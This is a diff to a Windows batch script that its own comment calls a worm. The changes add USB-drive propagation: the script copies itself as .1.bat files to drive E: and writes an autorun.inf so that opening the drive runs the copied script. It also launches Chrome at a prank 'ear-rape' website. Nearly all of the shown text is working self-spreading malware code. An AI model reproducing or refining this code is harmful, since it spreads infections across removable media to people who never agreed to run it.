@@ -32,6 +32,7 @@ if "%ERRORLEVEL%"=="0" goto yesedge
 
 REM worm copying to external drives
 ::if on usb copy to documents
+set /a loopsdone=0
 if exist "C:\Users\%username%\Documents\*.1.bat" goto pass1
 if /i "%CD:~0,3%" EQU "E:\" goto copyfromusbtodoc
 :pass1
@@ -46,18 +47,19 @@ if exist "E:\*.1.bat" goto loop
 
 for /r %%f in (*.1.bat) do (
 type %%~nxf >>"E:\%%~nxf"
-)
+::make autorun file
 if exist "E:\autorun.inf" del "E:\autorun.inf"
 echo [autorun]>>"E:\autorun.inf"
+echo open=%%~nxf>>"E:\autorun.inf"
 echo icon=icon.ico>>"E:\autorun.inf"
-echo open=%CD:~0,3%>>"E:\autorun.inf"
 echo action=Click to run.>>"E:\autorun.inf"
-echo shell\open\command=%CD:~0,3%>>"E:\autorun.inf"
+echo shell\open\command=%%~nxf>>"E:\autorun.inf"
+)
 goto loop
 
 ::open change window location if needed
 :yeschrome
-taskkill /F /IM chrome.exe
+::taskkill /F /IM chrome.exe
 start "Google Chrome" /HIGH chrome.exe "http://ear-rape-website.com"
 cls
 set /a okay=1
